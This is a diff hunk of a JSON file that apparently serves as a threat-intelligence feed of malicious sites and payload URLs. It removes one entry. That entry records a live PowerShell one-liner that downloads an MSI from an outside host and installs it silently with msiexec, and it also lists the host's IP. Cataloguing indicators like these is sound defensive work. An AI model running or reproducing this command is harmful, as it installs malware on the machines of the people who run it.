@@ -599,24 +599,5 @@
     ],
     "ReportId": "cmwerxwap0e0d0omlo90ozon6",
     "ScannedAt": "2026-11-13T09:28:22.206000+00:00"
-  },
-  {
-    "UrlDomain": "camillesuarez.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "199.188.200.146"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwel9plu0czo0omlez5ttanw",
-    "ScannedAt": "2026-11-13T06:21:36.065000+00:00"
   }
 ]
